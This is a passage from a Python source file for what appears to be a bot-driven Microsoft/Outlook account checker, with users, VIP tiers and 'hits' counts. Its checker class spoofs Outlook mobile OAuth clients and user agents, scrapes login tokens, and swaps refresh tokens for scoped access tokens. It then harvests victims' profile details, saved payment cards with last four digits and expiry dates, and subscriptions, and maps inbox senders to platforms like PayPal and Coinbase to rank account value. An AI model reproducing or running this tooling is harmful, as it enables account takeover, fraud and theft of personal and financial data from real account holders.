    ".co": "Colombia", ".cl": "Chile", ".pe": "Peru", ".in": "India",
    ".jp": "Japan", ".kr": "South Korea", ".cn": "China", ".au": "Australia",
    ".nz": "New Zealand", ".ca": "Canada", ".ie": "Ireland",
    ".co.uk": "United Kingdom", ".uk": "United Kingdom",
    ".sa": "Saudi Arabia", ".ae": "UAE", ".eg": "Egypt", ".il": "Israel",
    ".th": "Thailand", ".id": "Indonesia", ".my": "Malaysia", ".vn": "Vietnam",
    ".ph": "Philippines", ".za": "South Africa", ".ng": "Nigeria",
    ".pk": "Pakistan", ".bd": "Bangladesh",
    ".sg": "Singapore", ".hk": "Hong Kong", ".tw": "Taiwan",
    ".za": "South Africa", ".ng": "Nigeria", ".ke": "Kenya",
    ".vn": "Vietnam", ".ph": "Philippines", ".my": "Malaysia",
    ".id": "Indonesia", ".th": "Thailand", ".pk": "Pakistan",
}


def region_from_email(email: str) -> str:
    try:
        domain = email.split("@", 1)[1].lower()
        if domain.endswith(".co.uk"):
            return "United Kingdom"
        dot_idx = domain.rfind(".")
        if dot_idx != -1:
            tld = domain[dot_idx:]
            country = TLD_COUNTRY_MAP.get(tld)
            if country:
                return country
    except Exception:
        pass
    return ""


def get_flag(country: str) -> str:
    if not country or country == "N/A":
        return "🌍"
    return COUNTRY_FLAGS.get(country, "🌍")


def detect_subscription(platform: str, subjects: List[str]) -> str:
    patterns = SUBSCRIPTION_PATTERNS.get(platform, [])
    for subject in subjects:
        for pattern, tier in patterns:
            if pattern.search(subject):
                return tier
    return ""


DOMAIN_PLATFORM_MAP = {
    # Gaming
    "epicgames.com": "Epic Games",
    "riotgames.com": "Riot Games",
    "steampowered.com": "Steam",
    "steam.com": "Steam",
    "playstation.com": "PlayStation",
    "email.playstation.com": "PlayStation",
    "txn-email.playstation.com": "PlayStation",
    "email02.account.sony.com": "PlayStation",
    "sony.com": "PlayStation",
    "xbox.com": "Xbox",
    "id.supercell.com": "Supercell",
    "supercell.com": "Supercell",
    "roblox.com": "Roblox",
    "ubisoft.com": "Ubisoft",
    "news.ubisoft.com": "Ubisoft",
    "ea.com": "EA",
    "accounts.ea.com": "EA",
    "battle.net": "Battle.net",
    "blizzard.com": "Battle.net",
    "nintendo.com": "Nintendo",
    "rockstargames.com": "Rockstar",
    "minecraft.net": "Minecraft",
    "mojang.com": "Minecraft",
    "pubg.com": "PUBG",
    "pubgmobile.com": "PUBG Mobile",
    "leagueoflegends.com": "League of Legends",
    "valorant.com": "Valorant",
    "konami.com": "Konami",
    "fortnite.com": "Fortnite",
    # Streaming
    "netflix.com": "Netflix",
    "mailer.netflix.com": "Netflix",
    "email.netflix.com": "Netflix",
    "crunchyroll.com": "Crunchyroll",
    "disneyplus.com": "Disney+",
    "primevideo.com": "Amazon Prime Video",
    "hbomax.com": "HBO Max",
    "max.com": "HBO Max",
    "appletv.apple.com": "Apple TV+",
    "hulu.com": "Hulu",
    "paramountplus.com": "Paramount+",
    "plex.tv": "Plex",
    "youtube.com": "YouTube",
    # Music
    "spotify.com": "Spotify",
    "accounts.spotify.com": "Spotify",
    "em.spotify.com": "Spotify",
    "email.spotify.com": "Spotify",
    "music.apple.com": "Apple Music",
    "deezer.com": "Deezer",
    "soundcloud.com": "SoundCloud",
    "tidal.com": "Tidal",
    "youtubemusic.com": "YouTube Music",
    "music.youtube.com": "YouTube Music",
    # Finance
    "paypal.com": "PayPal",
    "paypal.co.uk": "PayPal",
    "paypal.de": "PayPal",
    "paypal.fr": "PayPal",
    "mail.paypal.com": "PayPal",
    "notifications.paypal.com": "PayPal",
    "coinbase.com": "Coinbase",
    "info.coinbase.com": "Coinbase",
    "email.coinbase.com": "Coinbase",
    "binance.com": "Binance",
    "wise.com": "Wise",
    "payoneer.com": "Payoneer",
    "skrill.com": "Skrill",
    "stripe.com": "Stripe",
    "kraken.com": "Kraken",
    "kucoin.com": "KuCoin",
    "bybit.com": "Bybit",
    "crypto.com": "Crypto.com",
    "metamask.io": "MetaMask",
    "ledger.com": "Ledger",
    "blockchain.com": "Blockchain",
    # E-commerce
    "amazon.com": "Amazon",
    "amazon.co.uk": "Amazon UK",
    "amazon.co.jp": "Amazon JP",
    "amazon.de": "Amazon",
    "amazon.fr": "Amazon",
    "amazon.es": "Amazon",
    "amazon.ca": "Amazon",
    "amazon.com.br": "Amazon",
    "ebay.com": "eBay",
    "ebay.co.uk": "eBay",
    "em.ebay.com": "eBay",
    "aliexpress.com": "AliExpress",
    "shein.com": "Shein",
    "temu.com": "Temu",
    "etsy.com": "Etsy",
    "nike.com": "Nike",
    # Social Media
    "facebook.com": "Facebook",
    "facebookmail.com": "Facebook",
    "meta.com": "Facebook",
    "instagram.com": "Instagram",
    "mail.instagram.com": "Instagram",
    "tiktok.com": "TikTok",
    "tiktokmail.com": "TikTok",
    "email.tiktok.com": "TikTok",
    "twitter.com": "Twitter (X)",
    "x.com": "Twitter (X)",
    "t.co": "Twitter (X)",
    "snapchat.com": "Snapchat",
    "linkedin.com": "LinkedIn",
    "e.linkedin.com": "LinkedIn",
    "em.linkedin.com": "LinkedIn",
    "pinterest.com": "Pinterest",
    "em.pinterest.com": "Pinterest",
    # Tech / Cloud
    "accounts.google.com": "Google",
    "google.com": "Google",
    "googleplay.com": "Google",
    "microsoft.com": "Microsoft",
    "dropbox.com": "Dropbox",
    "em.dropbox.com": "Dropbox",
    "onedrive.com": "OneDrive",
    "icloud.com": "iCloud",
    "yahoo.com": "Yahoo",
    "yahoomail.com": "Yahoo",
    "apple.com": "Apple",
    "id.apple.com": "Apple",
    "mega.nz": "MEGA",
    "canva.com": "Canva",
    "email.canva.com": "Canva",
    "adobe.com": "Adobe",
    "message.adobe.com": "Adobe",
    "slack.com": "Slack",
    "email.slack.com": "Slack",
    "nordvpn.com": "NordVPN",
    "nordaccount.com": "NordVPN",
    "expressvpn.com": "ExpressVPN",
    # Education / Dev
    "udemy.com": "Udemy",
    "email.udemy.com": "Udemy",
    "coursera.org": "Coursera",
    "edx.org": "edX",
    "skillshare.com": "Skillshare",
    "github.com": "GitHub",
    "gitlab.com": "GitLab",
    "stackoverflow.com": "Stack Overflow",
    "duolingo.com": "Duolingo",
    "medium.com": "Medium",
    "figma.com": "Figma",
    # Travel / Services
    "uber.com": "Uber",
    "t.uber.com": "Uber",
    "mgt.uber.com": "Uber",
    "em.uber.com": "Uber",
    "airbnb.com": "Airbnb",
    "em.airbnb.com": "Airbnb",
    "booking.com": "Booking.com",
    "bstatic.com": "Booking.com",
    "em.booking.com": "Booking.com",
    "tripadvisor.com": "Tripadvisor",
    # Communication
    "telegram.org": "Telegram",
    "whatsapp.com": "WhatsApp",
    "discord.com": "Discord",
    "email.discord.com": "Discord",
    "zoom.us": "Zoom",
    "skype.com": "Skype",
    # Misc / Entertainment
    "reddit.com": "Reddit",
    "redditmail.com": "Reddit",
    "twitch.tv": "Twitch",
    "em.twitch.tv": "Twitch",
    "kick.com": "Kick",
    "patreon.com": "Patreon",
    "quora.com": "Quora",
    "onlyfans.com": "OnlyFans",
    "email.onlyfans.com": "OnlyFans",
}


def resolve_sender_platform(sender_address: str) -> str:
    if not sender_address or sender_address == "Unknown":
        return "Unknown"
    exact = SENDER_MAP.get(sender_address)
    if exact:
        return exact
    try:
        domain = sender_address.split("@")[-1].lower()
        if domain in DOMAIN_PLATFORM_MAP:
            return DOMAIN_PLATFORM_MAP[domain]
        parts = domain.split(".")
        for i in range(1, len(parts) - 1):
            parent = ".".join(parts[i:])
            if parent in DOMAIN_PLATFORM_MAP:
                return DOMAIN_PLATFORM_MAP[parent]
    except Exception:
        pass
    return sender_address


# ================= SESSION POOL =================
class SessionPool:
    def __init__(self, pool_size=30):
        self.pool_size = pool_size
        self.sessions = Queue()
        self._init_pool()

    def _init_pool(self):
        from urllib3.util.retry import Retry
        retry = Retry(total=2, connect=0, backoff_factor=0.5,
                      status_forcelist=[429, 500, 502, 503, 504])
        for _ in range(self.pool_size):
            session = requests.Session()
            adapter = requests.adapters.HTTPAdapter(
                pool_connections=20,
                pool_maxsize=20,
                max_retries=retry,
                pool_block=False
            )
            session.mount('http://', adapter)
            session.mount('https://', adapter)
            self.sessions.put(session)

    def get_session(self):
        from urllib3.util.retry import Retry
        try:
            return self.sessions.get(timeout=10)
        except:
            session = requests.Session()
            retry = Retry(total=1, connect=0)
            adapter = requests.adapters.HTTPAdapter(pool_connections=5, pool_maxsize=5, max_retries=retry)
            session.mount('http://', adapter)
            session.mount('https://', adapter)
            return session

    def return_session(self, session):
        if self.sessions.qsize() < self.pool_size:
            session.cookies.clear()
            self.sessions.put(session)


session_pool = SessionPool(pool_size=THREADS_PER_JOB * MAX_CONCURRENT_JOBS + 20)


# ================= TIME MANAGER =================
def get_today_istanbul():
    utc_now = datetime.utcnow()
    istanbul_now = utc_now + timedelta(hours=3)
    return istanbul_now.date()


# ================= USER DATABASE =================
def load_users():
    if os.path.exists(USER_DATA_FILE):
        with open(USER_DATA_FILE, "r") as f:
            return json.load(f)
    return {}


def save_users(users):
    with open(USER_DATA_FILE, "w") as f:
        json.dump(users, f, indent=2, ensure_ascii=False)


def get_user(user_id: int) -> dict:
    users = load_users()
    user_id_str = str(user_id)
    today = get_today_istanbul().isoformat()

    auto_approved = user_id in ADMIN_IDS

    if user_id_str not in users:
        users[user_id_str] = {
            "vip_level": 0,
            "total_jobs": 0,
            "total_hits": 0,
            "banned": False,
            "approved": auto_approved,
            "custom_daily_limit": None,
            "username": "",
            "daily_stats": {"date": today, "files_uploaded": 0}
        }
        save_users(users)
        logger.info("New user created: %d approved=%s", user_id, auto_approved)
    else:
        user = users[user_id_str]
        if user.get("daily_stats", {}).get("date") != today:
            user["daily_stats"] = {"date": today, "files_uploaded": 0}
        user.setdefault("vip_level", 0)
        user.setdefault("total_jobs", 0)
        user.setdefault("total_hits", 0)
        user.setdefault("banned", False)
        user.setdefault("approved", auto_approved)
        user.setdefault("custom_daily_limit", None)
        user.setdefault("username", "")
        save_users(users)

    return users[user_id_str]


def get_daily_limit(user: dict) -> int:
    custom = user.get("custom_daily_limit")
    if custom is not None:
        return int(custom)
    return DAILY_FILE_LIMITS.get(user.get("vip_level", 0), DAILY_FILE_LIMITS[0])


def update_user(user_id: int, data: dict):
    users = load_users()
    uid_str = str(user_id)
    if uid_str not in users:
        get_user(user_id)
        users = load_users()
    users[uid_str].update(data)
    save_users(users)


def increment_daily_file_count(user_id: int):
    users = load_users()
    user_id_str = str(user_id)
    today = get_today_istanbul().isoformat()

    if user_id_str not in users:
        return
    if "daily_stats" not in users[user_id_str]:
        users[user_id_str]["daily_stats"] = {"date": today, "files_uploaded": 0}
    elif users[user_id_str]["daily_stats"].get("date") != today:
        users[user_id_str]["daily_stats"] = {"date": today, "files_uploaded": 0}

    users[user_id_str]["daily_stats"]["files_uploaded"] += 1
    save_users(users)


# ================= OUTLOOK SENDER-BASED CHECKER =================
class OutlookSenderChecker:
    PPFT_PATTERN1 = re.compile(r'name=\\"PPFT\\".*?value=\\"(.*?)\\"')
    PPFT_PATTERN2 = re.compile(r'name="PPFT".*?value="([^"]*)"')
    PPFT_PATTERN3 = re.compile(r'sFT:"(.*?)"')
    URLPOST_PATTERN1 = re.compile(r'urlPost":"(.*?)"')
    URLPOST_PATTERN2 = re.compile(r"urlPost:'(.*?)'")
    UAID_PATTERN1 = re.compile(r'name=\\"uaid\\" id=\\"uaid\\" value=\\"(.*?)\\"')
    UAID_PATTERN2 = re.compile(r'name="uaid" id="uaid" value="(.*?)"')
    OPID_PATTERN = re.compile(r'opid%3d([^%&]+)')
    OPIDT_PATTERN = re.compile(r'opidt%3d([^&]+)')
    CODE_PATTERN = re.compile(r'code=([^&]+)')

    # Rotate through multiple OAuth client IDs + redirect pairs
    _CLIENT_CONFIGS = [
        {
            "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
            "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
            "scope": "profile openid offline_access https://outlook.office.com/M365.Access",
        },
        {
            "client_id": "27922004-5251-4030-b22d-91ecd9a37ea4",
            "redirect_uri": "msauth://com.microsoft.outlookmobile/0000000048170EF2%3A%2F%2Foauth%2Fredirect",
            "scope": "profile openid offline_access https://outlook.office.com/M365.Access",
        },
        {
            "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
            "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
            "scope": "profile openid offline_access https://outlook.office.com/M365.Access",
        },
        {
            "client_id": "27922004-5251-4030-b22d-91ecd9a37ea4",
            "redirect_uri": "msauth://com.microsoft.outlookmobile/0000000048170EF2%3A%2F%2Foauth%2Fredirect",
            "scope": "profile openid offline_access https://outlook.office.com/M365.Access",
        },
    ]
    # Keep a simple thread-local counter for rotation
    _client_idx = 0
    _client_lock = threading.Lock()

    _USER_AGENTS = [
        "Mozilla/5.0 (Linux; Android 10; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 11; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; Samsung Galaxy S23) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
        "Microsoft Outlook/4.2344.0 (Android 13; Build 4.2344.0; Samsung Galaxy S23)",
        "com.microsoft.outlooklite/4.2405.0 (Android 12)",
    ]

    def __init__(self):
        self.session = requests.Session()
        from requests.adapters import HTTPAdapter
        from urllib3.util.retry import Retry
        retry_strategy = Retry(
            total=3,
            connect=0,
            backoff_factor=0.5,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["HEAD", "GET", "OPTIONS", "POST"]
        )
        adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=10, pool_maxsize=10)
        self.session.mount("https://", adapter)
        self.session.mount("http://", adapter)

        # Pick a client config and user-agent in round-robin
        with OutlookSenderChecker._client_lock:
            idx = OutlookSenderChecker._client_idx % len(self._CLIENT_CONFIGS)
            OutlookSenderChecker._client_idx += 1
        cfg = self._CLIENT_CONFIGS[idx]
        ua_idx = idx % len(self._USER_AGENTS)

        self.ua = self._USER_AGENTS[ua_idx]
        self.client_id = cfg["client_id"]
        self.redirect_uri = cfg["redirect_uri"]
        self._scope = cfg["scope"]
        # Per-session token cache: maps (refresh_token, scope) -> access_token
        self._token_cache: Dict[tuple, str] = {}

    def get_regex(self, pattern, text):
        match = pattern.search(text)
        return match.group(1) if match else None

    def extract_ppft(self, html):
        for pattern in [self.PPFT_PATTERN1, self.PPFT_PATTERN2, self.PPFT_PATTERN3]:
            match = pattern.search(html)
            if match:
                return match.group(1)
        return None

    @staticmethod
    def _decode_id_token(id_token):
        try:
            parts = id_token.split('.')
            if len(parts) >= 2:
                padding = 4 - len(parts[1]) % 4
                payload_b64 = parts[1] + ('=' * (padding % 4))
                return json.loads(base64.urlsafe_b64decode(payload_b64))
        except Exception:
            pass
        return {}

    LOCALE_TO_COUNTRY = {
        "en-US": "United States", "en-GB": "United Kingdom", "en-CA": "Canada",
        "en-AU": "Australia", "en-NZ": "New Zealand", "en-IE": "Ireland",
        "en-IN": "India", "fr-FR": "France", "fr-BE": "Belgium", "fr-CH": "Switzerland",
        "fr-CA": "Canada", "de-DE": "Germany", "de-AT": "Austria", "de-CH": "Switzerland",
        "es-ES": "Spain", "es-MX": "Mexico", "es-AR": "Argentina", "es-CO": "Colombia",
        "pt-BR": "Brazil", "pt-PT": "Portugal", "it-IT": "Italy", "nl-NL": "Netherlands",
        "nl-BE": "Belgium", "ru-RU": "Russia", "zh-CN": "China", "zh-TW": "Taiwan",
        "ja-JP": "Japan", "ko-KR": "South Korea", "ar-SA": "Saudi Arabia",
        "tr-TR": "Turkey", "pl-PL": "Poland", "sv-SE": "Sweden", "da-DK": "Denmark",
        "fi-FI": "Finland", "nb-NO": "Norway", "cs-CZ": "Czech Republic",
        "hu-HU": "Hungary", "ro-RO": "Romania", "uk-UA": "Ukraine", "el-GR": "Greece",
        "he-IL": "Israel", "th-TH": "Thailand", "id-ID": "Indonesia", "ms-MY": "Malaysia",
        "vi-VN": "Vietnam", "fa-IR": "Iran",
        "en-ZA": "South Africa", "en-PH": "Philippines", "en-SG": "Singapore",
        "en-MY": "Malaysia", "en-NG": "Nigeria", "en-PK": "Pakistan",
    }

    def _get_token_for_scope(self, refresh_token: str, scope: str) -> str:
        cache_key = (refresh_token[:32], scope)
        if cache_key in self._token_cache:
            return self._token_cache[cache_key]
        try:
            r = self.session.post(
                "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                data={
                    "client_id": self.client_id,
                    "grant_type": "refresh_token",
                    "refresh_token": refresh_token,
                    "scope": scope,
                },
                timeout=8
            )
            if r.status_code == 200:
                token = r.json().get("access_token", "")
                if token:
                    self._token_cache[cache_key] = token
                return token
        except Exception:
            pass
        return ""

    def get_account_profile(self, token, id_token="", refresh_token=""):
        name = "N/A"
        region = "N/A"

        # 1. Extract from id_token JWT claims
        if id_token:
            claims = self._decode_id_token(id_token)
            name = claims.get("name") or claims.get("given_name") or "N/A"
            locale = claims.get("locale") or ""
            if locale:
                region = self.LOCALE_TO_COUNTRY.get(locale, locale)

        # 2. OWA GetUserConfiguration
        try:
            owa_headers = {
                "Authorization": f"Bearer {token}",
                "User-Agent": self.ua,
                "Accept": "application/json",
                "Content-Type": "application/json",
            }
            r = self.session.post(
                "https://outlook.live.com/owa/service.svc?action=GetUserConfiguration&EP=1",
                headers=owa_headers,
                json={
                    "__type": "GetUserConfigurationRequest:#Exchange",
                    "Header": {
                        "__type": "JsonRequestHeaders:#Exchange",
                        "RequestServerVersion": "V2018_01_08"
                    }
                },
                timeout=6
            )
            if r.status_code == 200:
                d = r.json()
                owa_locale = (
                    d.get("UserOptions", {}).get("LocaleInfo", {}).get("LocaleName") or
                    d.get("OwaUserConfiguration", {}).get("SessionSettings", {}).get("UserCulture") or
                    d.get("SessionSettings", {}).get("UserCulture") or ""
                )
                country_raw = (
                    d.get("UserOptions", {}).get("LocaleInfo", {}).get("DisplayName") or
                    d.get("OwaUserConfiguration", {}).get("SessionSettings", {}).get("UserCountry") or
                    d.get("SessionSettings", {}).get("UserCountry") or ""
                )
                if country_raw:
                    region = country_raw
                elif owa_locale and region == "N/A":
                    region = self.LOCALE_TO_COUNTRY.get(owa_locale, owa_locale)
        except Exception:
            pass

        # 3. Microsoft Graph — extended profile fields
        if region == "N/A" or name == "N/A":
            try:
                r = self.session.get(
                    "https://graph.microsoft.com/v1.0/me"
                    "?$select=displayName,country,usageLocation,city,state,preferredLanguage",
                    headers={"Authorization": f"Bearer {token}", "User-Agent": "Outlook-Android/2.0"},
                    timeout=6
                )
                if r.status_code == 200:
                    d = r.json()
                    if name == "N/A":
                        name = d.get("displayName") or "N/A"
                    if region == "N/A":
                        country = d.get("country") or d.get("usageLocation") or ""
                        if country:
                            region = country
                    if region == "N/A":
                        lang = d.get("preferredLanguage") or ""
                        if lang:
                            region = self.LOCALE_TO_COUNTRY.get(lang, "")
            except Exception:
                pass

        # 4. Graph mailboxSettings — timezone/language fallback
        if region == "N/A":
            try:
                r = self.session.get(
                    "https://graph.microsoft.com/v1.0/me/mailboxSettings",
                    headers={"Authorization": f"Bearer {token}", "User-Agent": "Outlook-Android/2.0"},
                    timeout=6
                )
                if r.status_code == 200:
                    d = r.json()
                    lang = d.get("language", {}).get("locale") or ""
                    tz = d.get("timeZone") or ""
                    if lang:
                        region = self.LOCALE_TO_COUNTRY.get(lang, lang)
                    elif tz:
                        tz_match = re.search(r'^(\w+(?:\s\w+)?)\s+Standard\s+Time', tz)
                        if tz_match:
                            region = tz_match.group(1)
            except Exception:
                pass

        # 5. Microsoft Account API with refresh_token scoped token
        if (region == "N/A" or name == "N/A") and refresh_token:
            for scope in ["https://account.microsoft.com/.default", "wl.basic wl.emails wl.signin"]:
                acct_token = self._get_token_for_scope(refresh_token, scope)
                if not acct_token:
                    continue
                try:
                    r = self.session.get(
                        "https://api.account.microsoft.com/v1.0/users/me",
                        headers={
                            "Authorization": f"Bearer {acct_token}",
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                            "Accept": "application/json",
                        },
                        timeout=6
                    )
                    if r.status_code == 200:
                        d = r.json()
                        if name == "N/A":
                            name = d.get("displayName") or d.get("firstName") or "N/A"
                        if region == "N/A":
                            c = d.get("country") or d.get("usageLocation") or d.get("preferredLanguage") or ""
                            if c:
                                region = self.LOCALE_TO_COUNTRY.get(c, c)
                        if name != "N/A" and region != "N/A":
                            break
                except Exception:
                    continue

        return {"name": name, "region": region}

    def get_payment_methods(self, token, refresh_token=""):
        desktop_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

        def _try_endpoints(auth_token, ua=None):
            found = []
            h = {
                "Authorization": f"Bearer {auth_token}",
                "User-Agent": ua or "Outlook-Android/2.0",
                "Accept": "application/json",
            }
            endpoints = [
                "https://api.account.microsoft.com/users/me/paymentInstruments",
                "https://wallet.microsoft.com/api/v1/me/paymentInstruments",
                "https://account.microsoft.com/api/v1/paymentInstruments",
                "https://account.microsoft.com/api/v2/paymentInstruments",
                "https://api.account.microsoft.com/v1.0/users/me/paymentInstruments",
            ]
            for url in endpoints:
                try:
                    r = self.session.get(url, headers=h, timeout=6)
                    if r.status_code == 200:
                        data = r.json()
                        items = (data if isinstance(data, list)
                                 else data.get("value",
                                 data.get("paymentInstruments",
                                 data.get("items", []))))
                        for item in items:
                            kind = item.get("type") or item.get("instrumentType") or "Card"
                            last4 = item.get("lastFourDigits") or item.get("last4") or ""
                            brand = (item.get("brand") or item.get("cardType")
                                     or item.get("network") or "")
                            expiry = item.get("expirationDate") or item.get("expiry") or ""
                            parts = [p for p in [brand, kind, f"****{last4}" if last4 else ""] if p]
                            entry = " ".join(parts)
                            
                            # Check for status/details
                            details = []
                            if item.get("status") or item.get("state"):
                                details.append(str(item.get("status") or item.get("state")))
                            if item.get("isDefault") or item.get("isPrimary"):
                                details.append("Default")
                            if details:
                                entry += f" ({', '.join(details)})"
                                
                            if expiry:
                                entry += f" exp:{str(expiry)[:7]}"
                            if entry and entry not in found:
                                found.append(entry)
                        if found:
                            break
                except Exception:
                    continue
            return found

        # 1. Try with the current Outlook token
        result = _try_endpoints(token)
        if result:
            return result

        # 2. Try scoped tokens from refresh_token
        if refresh_token:
            for scope in [
                "https://account.microsoft.com/.default",
                "service::account.microsoft.com::MBI_SSL",
                "https://wallet.microsoft.com/.default",
            ]:
                scoped = self._get_token_for_scope(refresh_token, scope)
                if scoped:
                    result = _try_endpoints(scoped, desktop_ua)
                    if result:
                        return result

        return ["N/A"]

    # Exact SKU → clean display name (checked before fuzzy logic)
    _SKU_EXACT = {
        # Xbox Game Pass
        "GAME_PASS_ULTIMATE":               "Xbox Game Pass Ultimate",
        "XBOX_GAME_PASS_ULTIMATE":          "Xbox Game Pass Ultimate",
        "XGPU":                             "Xbox Game Pass Ultimate",
        "GPPCU":                            "Xbox Game Pass Ultimate",
        "GPPU":                             "Xbox Game Pass Ultimate",
        "XBOX_GAME_PASS_PC":               "Xbox Game Pass for PC",
        "GAME_PASS_PC":                     "Xbox Game Pass for PC",
        "XGPPC":                            "Xbox Game Pass for PC",
        "GPPC":                             "Xbox Game Pass for PC",
        "XBOX_GAME_PASS_CONSOLE":          "Xbox Game Pass Console",
        "GAME_PASS_CONSOLE":               "Xbox Game Pass Console",
        "XGPCONSOLE":                       "Xbox Game Pass Console",
        "XBOX_GAME_PASS_CORE":             "Xbox Game Pass Core",
        "GAME_PASS_CORE":                   "Xbox Game Pass Core",
        "XGPCORE":                          "Xbox Game Pass Core",
        "XBOX_LIVE_GOLD":                  "Xbox Live Gold",
        "GOLD":                             "Xbox Live Gold",
        # Microsoft 365 Personal/Family
        "OFFICESUBSCRIPTION":              "Microsoft 365 Personal",
        "MICROSOFT365_PERSONAL":           "Microsoft 365 Personal",
        "O365_PERSONAL":                   "Microsoft 365 Personal",
        "MICROSOFT365_FAMILY":             "Microsoft 365 Family",
        "O365_HOME":                       "Microsoft 365 Family",
        # Microsoft 365 Business
        "O365_BUSINESS_PREMIUM":           "Microsoft 365 Business Premium",
        "O365_BUSINESS_ESSENTIALS":        "Microsoft 365 Business Basic",
        "SPB":                             "Microsoft 365 Business Premium",
        "O365_BUSINESS":                   "Microsoft 365 Apps for Business",
        "MICROSOFT365_BUSINESS_BASIC":     "Microsoft 365 Business Basic",
        "MICROSOFT365_BUSINESS_STANDARD":  "Microsoft 365 Business Standard",
        "MICROSOFT365_BUSINESS_PREMIUM":   "Microsoft 365 Business Premium",
        "SMB_BUSINESS":                    "Microsoft 365 Business Basic",
        "SMB_BUSINESS_PREMIUM":            "Microsoft 365 Business Premium",
        # Microsoft 365 Enterprise
        "SPE_E3":                          "Microsoft 365 E3",
        "SPE_E5":                          "Microsoft 365 E5",
        "M365_E3":                         "Microsoft 365 E3",
        "M365_E5":                         "Microsoft 365 E5",
        "M365_F1":                         "Microsoft 365 F1",
        "M365_F3":                         "Microsoft 365 F3",
        "ENTERPRISEPREMIUM":               "Microsoft 365 E5",
        "ENTERPRISEPACK":                  "Microsoft 365 E3",
        # Office Apps
        "O365_PROPLUS":                    "Microsoft 365 Apps",
        "OFFICE365_PROPLUS":               "Microsoft 365 Apps",
        "MICROSOFT365_APPS_FOR_BUSINESS":  "Microsoft 365 Apps for Business",
        "MICROSOFT365_APPS_FOR_ENTERPRISE":"Microsoft 365 Apps for Enterprise",
        # Exchange / SharePoint / Teams
        "EXCHANGESTANDARD":                "Exchange Online (Plan 1)",
        "EXCHANGEENTERPRISE":              "Exchange Online (Plan 2)",
        "SHAREPOINTSTANDARD":              "SharePoint Online (Plan 1)",
        "SHAREPOINTENTERPRISE":            "SharePoint Online (Plan 2)",
        "TEAMS_EXPLORATORY":               "Microsoft Teams",
        "MCOCAP":                          "Teams Phone",
        "MCOPSTN1":                        "Teams Calling Plan",
        # Power Platform
        "POWER_BI_PRO":                    "Power BI Pro",
        "PBI_PREMIUM_USER":                "Power BI Premium",
        "POWER_BI_PREMIUM_USER":           "Power BI Premium",
        "FLOW_FREE":                       "Power Automate Free",
        "FLOW_PER_USER":                   "Power Automate",
        "POWERAPPS_PER_USER":              "Power Apps",
        # Visio / Project
        "VISIOCLIENT":                     "Visio Plan 2",
        "VISIOONLINE_PLAN1":               "Visio Plan 1",
        "PROJECTPREMIUM":                  "Project Plan 5",
        "PROJECTPROFESSIONAL":             "Project Plan 3",
        "PROJECT_PLAN1":                   "Project Plan 1",
        # Security
        "DEFENDER_ENDPOINT_P1":            "Microsoft Defender",
        "DEFENDER_ENDPOINT_P2":            "Microsoft Defender P2",
        "ATP_ENTERPRISE":                  "Microsoft Defender for Office 365",
        "AAD_PREMIUM":                     "Entra ID Premium P1",
        "AAD_PREMIUM_P2":                  "Entra ID Premium P2",
        "EMS":                             "Enterprise Mobility + Security",
        "EMS_E3":                          "EMS E3",
        "EMS_E5":                          "EMS E5",
        # Storage
        "ONEDRIVE_BASIC":                  "OneDrive 100 GB",
        "ONEDRIVE_STORAGE":                "OneDrive Storage",
        # Other
        "INTUNE_A":                        "Microsoft Intune",
        "WIN_ENT_E3":                      "Windows Enterprise E3",
        "WIN_ENT_E5":                      "Windows Enterprise E5",
        "COPILOT_MICROSOFT_365":           "Microsoft 365 Copilot",
        "MCOPSTNC":                        "Communications Credits",
    }

    def _classify_sku(self, sku: str) -> str:
        s = sku.strip().upper()
        # 1. exact match
        if s in self._SKU_EXACT:
            return self._SKU_EXACT[s]
        # 2. fuzzy / keyword match
        if any(k in s for k in ("GAME_PASS_ULTIMATE", "XGPU", "GPPU")):
            return "Xbox Game Pass Ultimate"
        if any(k in s for k in ("GAME_PASS_PC", "XGPPC", "GPPC")):
            return "Xbox Game Pass for PC"
        if any(k in s for k in ("GAME_PASS_CORE", "XGPCORE")):
            return "Xbox Game Pass Core"
        if any(k in s for k in ("GAME_PASS_CONSOLE", "XGPCONSOLE")):
            return "Xbox Game Pass Console"
        if any(k in s for k in ("GAME_PASS", "GAMEPASS")):
            return "Xbox Game Pass"
        if "XBOX_LIVE_GOLD" in s or "XBOXLIVE_GOLD" in s:
            return "Xbox Live Gold"
        if "COPILOT" in s:
            return "Microsoft 365 Copilot"
        if any(k in s for k in ("M365", "MICROSOFT365")):
            if "E5" in s:
                return "Microsoft 365 E5"
            if "E3" in s:
                return "Microsoft 365 E3"
            if "F3" in s or "F1" in s:
                return "Microsoft 365 F-Tier"
            if "BUSINESS_PREMIUM" in s:
                return "Microsoft 365 Business Premium"
            if "BUSINESS_STANDARD" in s:
                return "Microsoft 365 Business Standard"
            if "BUSINESS" in s:
                return "Microsoft 365 Business Basic"
            if "FAMILY" in s or "HOME" in s:
                return "Microsoft 365 Family"
            if "PERSONAL" in s:
                return "Microsoft 365 Personal"
            return "Microsoft 365"
        if any(k in s for k in ("O365", "OFFICE365", "OFFICESUBSCRIPTION")):
            if "E5" in s:
                return "Office 365 E5"
            if "E3" in s:
                return "Office 365 E3"
            if "BUSINESS_PREMIUM" in s or "PREMIUM" in s:
                return "Office 365 Business Premium"
